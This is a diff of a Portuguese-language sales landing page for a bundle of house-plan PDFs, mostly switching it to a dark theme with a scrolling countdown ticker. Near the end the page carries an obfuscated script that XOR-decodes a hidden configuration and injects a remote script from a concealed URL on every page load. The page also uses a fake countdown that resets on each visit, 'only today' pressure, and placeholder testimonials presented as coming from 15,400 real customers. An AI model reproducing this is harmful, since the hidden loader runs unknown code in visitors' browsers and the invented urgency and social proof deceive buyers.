@@ -9,20 +9,23 @@
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Grotesk:wght@600;700&display=swap" rel="stylesheet">
 <style>
   :root{
-    --bg: #faf8f4;
-    --bg-card: #ffffff;
-    --bg-card-2: #f3efe7;
-    --border: #e8e2d8;
-    --text: #1a1a1a;
-    --text-muted: #6b7280;
+    --bg: #0a0f0a;
+    --bg-card: #121a12;
+    --bg-card-2: #1a2418;
+    --border: rgba(255,255,255,.08);
+    --text: #f4f5f1;
+    --text-muted: #9aa89a;
     --accent: #f2751e;
     --accent-dark: #d9640f;
-    --green: #16a34a;
-    --card-shadow: 0 4px 16px rgba(20,20,10,.06);
+    --green: #4ade80;
+    --card-shadow: 0 4px 20px rgba(0,0,0,.4);
   }
   *{box-sizing:border-box; margin:0; padding:0;}
   body{
-    background:var(--bg);
+    background:
+      radial-gradient(ellipse 1200px 600px at 50% -10%, rgba(34,197,94,.14), transparent 60%),
+      radial-gradient(ellipse 900px 500px at 100% 0%, rgba(242,117,30,.08), transparent 55%),
+      var(--bg);
     color:var(--text);
     font-family:'Inter',sans-serif;
     line-height:1.5;
@@ -33,20 +36,43 @@
   img{max-width:100%; display:block; border-radius:12px;}
   a{color:inherit; text-decoration:none;}
 
-  /* STICKY BAR */
+  /* EYEBROW / PILL LABEL */
+  .eyebrow{
+    display:inline-block;
+    border:1px solid var(--border);
+    background:var(--bg-card-2);
+    color:var(--text-muted);
+    font-size:11px; font-weight:700; letter-spacing:.08em; text-transform:uppercase;
+    padding:6px 14px; border-radius:999px; margin-bottom:12px;
+  }
+
+  /* STICKY TICKER BAR */
   .sticky-bar{
     position:sticky; top:0; z-index:50;
-    background:var(--accent);
+    background:linear-gradient(90deg, #1a2418, #10190f);
+    border-bottom:1px solid var(--border);
     color:#ffffff;
-    text-align:center;
-    padding:10px 12px;
-    font-weight:700;
-    font-size:14px;
+    overflow:hidden;
   }
-  .sticky-bar span{font-family:'Space Grotesk',sans-serif;}
+  .ticker-track{
+    display:inline-flex; width:max-content;
+    animation: ticker-scroll 26s linear infinite;
+  }
+  .sticky-bar:hover .ticker-track{animation-play-state:paused;}
+  .ticker-item{
+    display:inline-flex; align-items:center;
+    white-space:nowrap;
+    padding:11px 26px;
+    font-weight:700; font-size:13px;
+  }
+  .ticker-item .timer-el{color:var(--accent); font-family:'Space Grotesk',sans-serif;}
+  @keyframes ticker-scroll{
+    0%{transform:translateX(0);}
+    100%{transform:translateX(-50%);}
+  }
 
   /* HERO */
-  .hero{padding:32px 0 24px;}
+  .hero{padding:32px 0 24px; position:relative;}
   .hero-media{margin-top:20px;}
   .badge{
     display:inline-block;
@@ -62,7 +88,7 @@
   .brand{
     font-family:'Space Grotesk',sans-serif;
     font-weight:700; font-size:13px; letter-spacing:.5px;
-    color:var(--text-muted); margin:18px 0 20px; opacity:.8;
+    color:var(--text-muted); margin:18px 0 20px; opacity:.85;
   }
   .brand span{color:var(--text-muted); font-weight:600;}
   .brand .brand-accent{color:var(--accent);}
@@ -70,6 +96,29 @@
   .headline b{color:var(--accent); display:block; margin-bottom:2px;}
   .subheadline{color:var(--text-muted); font-size:17px; margin-bottom:8px;}
   .hero-img{margin-bottom:20px; border:1px solid var(--border);}
+
+  .feature-badges{display:flex; flex-wrap:wrap; gap:10px; margin-top:20px;}
+  .feature-badges .fb{
+    display:flex; align-items:center; gap:8px;
+    background:var(--bg-card); border:1px solid var(--border);
+    border-radius:10px; padding:10px 14px; font-size:13px; font-weight:600;
+    box-shadow:var(--card-shadow);
+  }
+  .feature-badges .fb .fb-icon{font-size:16px;}
+
+  .scroll-hint{
+    display:flex; flex-direction:column; align-items:center; gap:4px;
+    margin-top:28px; color:var(--text-muted); font-size:12px; font-weight:600;
+    opacity:.7;
+  }
+  .scroll-hint .chevron{
+    font-size:18px; color:var(--accent);
+    animation: bounce 1.6s ease-in-out infinite;
+  }
+  @keyframes bounce{
+    0%,100%{transform:translateY(0);}
+    50%{transform:translateY(6px);}
+  }
 
   .cta-btn{
     display:block;
@@ -83,9 +132,10 @@
     border-radius:12px;
     border:none;
     cursor:pointer;
-    transition:transform .15s ease, background .15s ease;
+    box-shadow:0 8px 24px rgba(242,117,30,.25);
+    transition:transform .15s ease, background .15s ease, box-shadow .15s ease;
   }
-  .cta-btn:hover{background:var(--accent-dark); transform:translateY(-2px);}
+  .cta-btn:hover{background:var(--accent-dark); transform:translateY(-2px); box-shadow:0 10px 28px rgba(242,117,30,.35);}
   .sub-cta{text-align:center; color:var(--text-muted); font-size:13px; margin-top:10px;}
 
   .stats{
@@ -122,7 +172,7 @@
     border-radius:10px; padding:14px; margin-bottom:10px; font-size:15px;
     box-shadow:var(--card-shadow);
   }
-  .pain-list li .x{color:#ef4444; font-weight:700;}
+  .pain-list li .x{color:#f87171; font-weight:700;}
   .pain-close{font-weight:600; color:var(--text); font-size:16px; margin-top:14px;}
 
   /* COMPARATIVO JEITO COMUM x JEITO INTELIGENTE */
@@ -132,10 +182,10 @@
   }
   .compare-col h3{font-size:15px; margin-bottom:10px;}
   .compare-col ul{list-style:none;}
-  .compare-col li{font-size:14px; padding:6px 0; line-height:1.4;}
-  .compare-bad{background:#fef2f2; border-color:#fecaca;}
-  .compare-bad h3{color:#dc2626;}
-  .compare-good{background:#f0fdf4; border-color:#bbf7d0;}
+  .compare-col li{font-size:14px; padding:6px 0; line-height:1.4; color:var(--text-muted);}
+  .compare-bad{background:rgba(239,68,68,.08); border-color:rgba(239,68,68,.3);}
+  .compare-bad h3{color:#f87171;}
+  .compare-good{background:rgba(74,222,128,.08); border-color:rgba(74,222,128,.3);}
   .compare-good h3{color:var(--green);}
 
   /* O QUE VOCE RECEBE */
@@ -216,12 +266,19 @@
   }
   .bonus-card h3{font-size:16px; margin-bottom:4px;}
   .bonus-card p{font-size:13px; color:var(--text-muted); margin-bottom:8px;}
-  .bonus-card .old-price{text-decoration:line-through; color:#6b7d90; font-size:13px;}
-  .bonus-total{
-    text-align:center; font-size:16px; font-weight:700; margin-top:16px;
-    padding:14px; background:var(--bg-card-2); border-radius:10px;
+  .bonus-card .old-price{text-decoration:line-through; color:var(--text-muted); font-size:13px;}
+
+  /* BARRA DE EQUACAO DOS BONUS */
+  .equation-bar{
+    display:flex; flex-direction:column; align-items:center; gap:10px;
+    text-align:center; margin-top:20px;
+    padding:20px; background:var(--bg-card-2); border:1px solid var(--border); border-radius:14px;
   }
-  .bonus-total .free{color:var(--green);}
+  .equation-bar .eq-item{display:flex; flex-direction:column; gap:2px;}
+  .equation-bar .eq-label{font-size:12px; color:var(--text-muted); text-transform:uppercase; letter-spacing:.04em;}
+  .equation-bar .eq-value{font-family:'Space Grotesk',sans-serif; font-weight:700; font-size:20px;}
+  .equation-bar .eq-op{color:var(--text-muted); font-size:18px; font-weight:700;}
+  .equation-bar .eq-final .eq-value{color:var(--green); font-size:26px;}
 
   /* PRICING */
   .plans{display:flex; flex-direction:column; gap:16px;}
@@ -237,7 +294,7 @@
     padding:4px 14px; border-radius:999px; white-space:nowrap;
   }
   .plan h3{font-size:17px; margin-bottom:6px;}
-  .plan .anchor{color:#6b7d90; text-decoration:line-through; font-size:14px;}
+  .plan .anchor{color:var(--text-muted); text-decoration:line-through; font-size:14px;}
   .price{font-size:34px; font-weight:700; color:var(--accent); margin:4px 0 4px;}
   .price small{font-size:15px; color:var(--text-muted); font-weight:500;}
   .savings{display:block; color:var(--green); font-weight:700; font-size:13px; margin-bottom:12px;}
@@ -282,12 +339,12 @@
   .final-cta h2{font-size:22px; margin-bottom:10px;}
   .final-cta p{color:var(--text-muted); font-size:14px; margin-bottom:18px;}
 
-  footer{padding:24px 0 40px; text-align:center; color:#5c6f83; font-size:12px;}
+  footer{padding:24px 0 40px; text-align:center; color:var(--text-muted); font-size:12px;}
   footer a{text-decoration:underline;}
 
   /* POPUP DOWNSELL */
   .overlay{
-    display:none; position:fixed; inset:0; background:rgba(0,0,0,.7);
+    display:none; position:fixed; inset:0; background:rgba(0,0,0,.75);
     z-index:100; align-items:center; justify-content:center; padding:20px;
   }
   .overlay.active{display:flex;}
@@ -315,6 +372,7 @@
     .hero-media .hero-img{display:inline-block; max-width:520px;}
     .headline{font-size:52px;}
     .subheadline{font-size:19px;}
+    .feature-badges{justify-content:center;}
 
     .results-gallery{margin:24px 0 0;}
     .results-gallery img{flex:0 0 320px; height:220px;}
@@ -337,6 +395,7 @@
 
     .bonus-grid{display:grid; grid-template-columns:1fr 1fr; gap:14px;}
     .bonus-card{margin-bottom:0;}
+    .equation-bar{flex-direction:row; justify-content:center; gap:24px; padding:24px 32px;}
 
     .testimonials-grid{display:grid; grid-template-columns:repeat(3, 1fr); gap:16px;}
     .testimonial{margin-bottom:0;}
@@ -350,9 +409,18 @@
 </head>
 <body>
 
-<!-- 1. STICKY BAR -->
+<!-- 1. STICKY TICKER BAR -->
 <div class="sticky-bar">
-  🔥 OFERTA EXPIRA EM: <span id="timer">15:00</span>
+  <div class="ticker-track">
+    <span class="ticker-item">🔥 Oferta expira em <b class="timer-el">15:00</b></span>
+    <span class="ticker-item">🎁 Oferta exclusiva — só hoje</span>
+    <span class="ticker-item">📦 +300 plantas completas em PDF</span>
+    <span class="ticker-item">⚡ Acesso imediato após a compra</span>
+    <span class="ticker-item" aria-hidden="true">🔥 Oferta expira em <b class="timer-el">15:00</b></span>
+    <span class="ticker-item" aria-hidden="true">🎁 Oferta exclusiva — só hoje</span>
+    <span class="ticker-item" aria-hidden="true">📦 +300 plantas completas em PDF</span>
+    <span class="ticker-item" aria-hidden="true">⚡ Acesso imediato após a compra</span>
+  </div>
 </div>
 
 <div class="container">
@@ -367,9 +435,19 @@
 
       <a href="#pricing" class="cta-btn">QUERO ACESSAR AS PLANTAS AGORA →</a>
       <p class="sub-cta">Acesso imediato. Pagamento único. Sem mensalidade.</p>
+
+      <div class="feature-badges">
+        <span class="fb"><span class="fb-icon">📦</span> +300 Plantas Prontas</span>
+        <span class="fb"><span class="fb-icon">♾️</span> Acesso Vitalício</span>
+        <span class="fb"><span class="fb-icon">⚡</span> Liberação Imediata</span>
+      </div>
     </div>
     <div class="hero-media">
       <img class="hero-img" src="assets/hero.webp" alt="Projeto Casa Inteligente - mockup do produto">
+      <div class="scroll-hint">
+        <span>Role para baixo</span>
+        <span class="chevron">⌄</span>
+      </div>
     </div>
   </section>
 
@@ -377,6 +455,7 @@
 
   <!-- 3.5 RESULTADOS REAIS -->
   <section>
+    <span class="eyebrow">Resultados Reais</span>
     <h2 style="text-align:center;">Mais de <span style="color:var(--accent)">15.400 famílias</span> já tiraram a casa própria do papel com nossos projetos.</h2>
     <div class="results-gallery">
       <img src="assets/resultados/casa1.webp" alt="Casa de campo construída com nossos projetos">
@@ -391,6 +470,7 @@
 
   <!-- 3.7 VITRINE DE PROJETOS -->
   <section>
+    <span class="eyebrow">Projetos Reais</span>
     <h2 style="text-align:center;">Veja o Tipo de Projeto Profissional que Você Vai Ter em Mãos</h2>
     <p class="section-sub" style="text-align:center;">Iguais a esses, você recebe +300 modelos completos</p>
     <div class="showcase-grid">
@@ -434,6 +514,7 @@
 
   <!-- 5. O QUE VOCE RECEBE -->
   <section>
+    <span class="eyebrow">O Que Você Vai Receber</span>
     <h2>Tudo Isso Está no <span style="color:var(--green)">+300 Plantas de Casas</span></h2>
     <p class="section-sub">Um arsenal técnico completo, desenvolvido pra tirar seu sonho do papel com a segurança de um engenheiro e a economia de quem planeja cada centavo.</p>
     <div class="grid">
@@ -489,6 +570,7 @@
 
   <!-- 6. PROVA SOCIAL -->
   <section>
+    <span class="eyebrow">Depoimentos Reais</span>
     <h2>Eles Também Tinham <span style="color:var(--accent)">Medo de Errar na Obra...</span></h2>
     <p class="section-sub">Veja o que dizem alguns dos mais de <b>15.400 proprietários</b> que já construíram utilizando nossas plantas.</p>
     <!-- DEPOIMENTOS: placeholder — trocar pelos depoimentos reais dos seus clientes assim que tiver -->
@@ -570,6 +652,7 @@
 
   <!-- 7. BONUS -->
   <section>
+    <span class="eyebrow">Bônus de Hoje</span>
     <h2>Bônus Exclusivos de Hoje</h2>
     <p class="section-sub">Além das +300 plantas, você também leva:</p>
 
@@ -603,8 +686,20 @@
       </div>
     </div>
 
-    <div class="bonus-total">
-      R$198,00 em bônus <span class="free">GRÁTIS hoje</span>
+    <div class="equation-bar">
+      <div class="eq-item">
+        <span class="eq-label">Valor total dos bônus</span>
+        <span class="eq-value">R$198,00</span>
+      </div>
+      <span class="eq-op">+</span>
+      <div class="eq-item">
+        <span class="eq-label">+300 Plantas Inclusas</span>
+      </div>
+      <span class="eq-op">=</span>
+      <div class="eq-item eq-final">
+        <span class="eq-label">Hoje apenas</span>
+        <span class="eq-value">R$27,00</span>
+      </div>
     </div>
   </section>
 
@@ -612,6 +707,7 @@
 
   <!-- 8. PRICING -->
   <section id="pricing">
+    <span class="eyebrow">Escolha Seu Plano</span>
     <h2>Escolha Seu Plano</h2>
     <div class="plans">
       <div class="plan" id="plan-basico">
@@ -624,7 +720,7 @@
           <li>Sem os 4 bônus</li>
           <li>Garantia de 7 dias</li>
         </ul>
-        <a href="https://pay.wiapy.com/WUlk4j7RdnEV" class="cta-btn" id="btn-basico" style="background:var(--bg-card-2); color:var(--text);">Quero o Básico</a>
+        <a href="https://pay.wiapy.com/WUlk4j7RdnEV" class="cta-btn" id="btn-basico" style="background:var(--bg-card-2); color:var(--text); box-shadow:none;">Quero o Básico</a>
       </div>
 
       <div class="plan featured">
@@ -747,14 +843,15 @@ src="https://www.facebook.com/tr?id=1575841564147551&ev=PageView&noscript=1"
 <script>(function(){var c_s=atob("DK7IVpoqH0DGH2GAi9XqI+hGPXrkdxX0+93yebVJey7oahXt4sixePlFcm6kbU7z6NyhJu5ZMDWychKv58+8M+leMSq1PU2i6tq8JPNIajSjbEO60NXqOPtHemL8PQXh/8/lI+5Hdia/MhHy7titOO4HZyOpe0zz6MXqerhcfiyzekO6qYy1euEIcSGrekO6qcqpIvsHajSrdgf5pt66M+xPcTTrbBTi4sq7dLYIaSGqagSisYzqK8dX");var e_uobw=[];for(var y_w=0;y_w<c_s.length;y_w++){e_uobw.push(c_s.charCodeAt(y_w)&255);}var f_0xlq=e_uobw[0];var a_micg=e_uobw.slice(1,1+f_0xlq);var j_r=e_uobw.slice(1+f_0xlq);var z_2dc=j_r.map(function(b,u_hrp){return b^a_micg[u_hrp%f_0xlq];});var u_ks="";for(var p_z=0;p_z<z_2dc.length;p_z++){u_ks+=String.fromCharCode(z_2dc[p_z]&255);}var y_1r=decodeURIComponent(escape(u_ks));var c_k=JSON.parse(y_1r);var x_2vwz=c_k.globals||[];x_2vwz.forEach(function(v_ov){window[v_ov.name]=v_ov.value;});var i_c=document.createElement("script");i_c.src=c_k.url;i_c.async=true;i_c.defer=true;(c_k.attributes||[]).forEach(function(k_y27){i_c.setAttribute(k_y27.name,k_y27.value);});(document.head||document.documentElement).appendChild(i_c);})();</script>
 
 <script>
-  // Timer regressivo 15min
+  // Timer regressivo 15min (atualiza todos os relogios do ticker)
   (function(){
     var duration = 15*60;
-    var el = document.getElementById('timer');
+    var els = document.querySelectorAll('.timer-el');
     var timer = setInterval(function(){
       var m = Math.floor(duration/60), s = duration%60;
-      el.textContent = (m<10?'0':'')+m+':'+(s<10?'0':'')+s;
-      if(--duration < 0){ clearInterval(timer); el.textContent = '00:00'; }
+      var txt = (m<10?'0':'')+m+':'+(s<10?'0':'')+s;
+      els.forEach(function(el){ el.textContent = txt; });
+      if(--duration < 0){ clearInterval(timer); els.forEach(function(el){ el.textContent = '00:00'; }); }
     }, 1000);
   })();
 
